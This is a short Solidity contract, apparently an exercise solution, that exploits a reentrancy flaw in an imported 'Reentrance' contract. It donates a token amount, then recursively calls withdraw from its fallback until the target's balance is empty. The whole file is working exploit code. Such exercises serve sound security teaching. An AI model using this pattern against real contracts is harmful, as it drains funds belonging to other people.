// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance; 
     uint public amount = 1; 

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(contractAddress);
    }

    fallback() external payable {
    if (address(reentrance).balance != 0 ) {
        reentrance.withdraw(); 
    }
}

    function hackContract() external {
        // Code me!
        reentrance.donate{value: amount}(address(this));
        reentrance.withdraw();
    }
}
